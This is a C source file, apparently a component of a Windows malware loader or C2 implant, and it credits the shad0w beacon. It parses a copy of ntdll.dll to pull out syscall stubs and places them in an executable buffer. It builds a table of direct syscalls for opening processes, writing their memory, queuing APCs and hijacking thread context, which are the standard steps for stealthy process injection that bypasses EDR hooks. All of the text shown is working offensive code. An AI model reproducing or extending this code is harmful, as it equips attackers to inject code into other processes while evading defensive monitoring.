#include <windows.h>

#include <tlhelp32.h>
#include <stdio.h>
#include <winternl.h>
#include "Header.h"
#define SYSCALL_STUB_SIZE 23
#define NTDLL_PATH "C:\\Windows\\System32\\ntdll.dll"

extern CHAR SyscallStub[SYSCALL_STUB_SIZE];

//Syscall resolution code taken from https://github.com/bats3c/shad0w/blob/master/beacon/src/syscalls.c

PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section, BOOL onDisk)
{
    if (onDisk) {
        return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
    }
    else {
        return (PVOID)RVA;
    }
}

BOOL MakeSyscall(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub, BOOL onDisk)
{
    DWORD  dwOldProc = 0;
    PDWORD pdwAddressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection, onDisk);
    PDWORD pdwAddressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection,onDisk);
    BOOL   bStubFound = FALSE;

    for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)
    {
        DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + pdwAddressOfNames[i], rdataSection, onDisk);
        DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + pdwAddressOfFunctions[i + 1], textSection, onDisk);
        LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
        if (strcmp(functionNameResolved, functionName) == 0)
        {
            memcpy((LPVOID)syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
            VirtualProtect((LPVOID)syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProc);
            bStubFound = TRUE;
        }
    }
    return bStubFound;
}

VOID CleanSyscall(LPVOID syscallStub)
{
    DWORD dwOldProc = 0;
    CHAR* pcOverWrite = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

    VirtualProtect((LPVOID)syscallStub, SYSCALL_STUB_SIZE, PAGE_READWRITE, &dwOldProc);
    memcpy((LPVOID)syscallStub, (LPVOID)pcOverWrite, SYSCALL_STUB_SIZE);

    return;
}

VOID ParseNtdll(struct NtInfo* NtdllInfo, struct Syscalls* SyscallTable, LPVOID dumpedNTDLL, DWORD dumpSize, BOOL onDisk)
{
    HANDLE hFile;
    DWORD  dwFileSize;
    LPVOID lpFileData;
    DWORD  dwBytesRead;

    DWORD dwOldProc = 0;

    SyscallTable->NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)(LPVOID)SyscallStub;
    SyscallTable->NtProtectVirtualMemory = (_NtProtectVirtualMemory)(LPVOID)SyscallStub;
    SyscallTable->NtWriteVirtualMemory = (_NtWriteVirtualMemory)(LPVOID)SyscallStub;
    SyscallTable->NtQueueApcThread = (_NtQueueApcThread)(LPVOID)SyscallStub;
    SyscallTable->NtOpenProcess = (_NtOpenProcess)(LPVOID)SyscallStub;
    SyscallTable->NtSuspendThread = (_NtSuspendThread)(LPVOID)SyscallStub;
    SyscallTable->NtGetContextThread = (_NtGetContextThread)(LPVOID)SyscallStub;
    SyscallTable->NtSetContextThread = (_NtSetContextThread)(LPVOID)SyscallStub;
    SyscallTable->NtResumeThread = (_NtResumeThread)(LPVOID)SyscallStub;

    VirtualProtect(SyscallStub, SYSCALL_STUB_SIZE, PAGE_READWRITE, &dwOldProc);

    NtdllInfo->lpRawData = dumpedNTDLL;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)NtdllInfo->lpRawData;
    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)NtdllInfo->lpRawData + dosHeader->e_lfanew);
    DWORD dwExportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
    NtdllInfo->pTextSection = section;
    NtdllInfo->pRdataSection = section;

    for (INT i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++)
    {
        if (strncmp(section->Name, ".rdata", 6) == NULL)
        {
            NtdllInfo->pRdataSection = section;
            break;
        }
        section++;
    }

    NtdllInfo->pExprtDir = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)NtdllInfo->lpRawData + dwExportDirRVA, NtdllInfo->pRdataSection, onDisk);
}